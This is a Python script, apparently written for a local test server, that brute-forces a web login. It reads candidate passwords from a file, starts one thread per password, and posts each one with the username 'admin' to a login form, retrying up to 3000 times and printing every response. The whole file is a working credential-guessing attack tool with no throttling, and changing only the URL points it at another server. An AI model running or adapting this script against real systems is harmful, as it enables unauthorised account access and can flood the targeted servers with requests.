import requests
from requests.adapters import HTTPAdapter
import threading

def send_requests(username, password):
    url = 'http://localhost:5000/'  # Change this to match your server URL
    data = {'username': username, 'password': password,'submit': 'Login'}
    with requests.Session() as session:
        adapter = HTTPAdapter(max_retries=3000)  # Adjust the number of retries as needed
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        response = session.post(url, data=data)
        print(f'Response for username: {username}, password: {password} - {response.text}')

def read_passwords_from_file(file_path):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords

def main():
    username = 'admin'
    password_file = 'generated_passwords.txt'  # Path to your password file
    passwords = read_passwords_from_file(password_file)

    threads = []
    for password in passwords:
        thread = threading.Thread(target=send_requests, args=(username, password))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
